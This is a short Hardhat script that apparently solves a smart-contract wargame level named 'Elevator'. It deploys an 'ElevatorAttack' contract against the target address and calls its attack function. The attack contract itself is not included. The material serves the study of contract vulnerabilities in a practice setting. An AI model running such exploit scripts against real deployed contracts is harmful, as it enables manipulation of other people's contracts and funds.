import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x86699f95700424A20eDf530041f3869480604aC9"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Elevator", CONTRACT_ADDRESS, signer)
    const _provider = contract.provider;


    const ElevatorAttackContract = await ethers.getContractFactory("ElevatorAttack")
    const elevatorAttackContract = await ElevatorAttackContract.deploy(contract.address)
    await elevatorAttackContract.deployed()

    await elevatorAttackContract.attack();
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});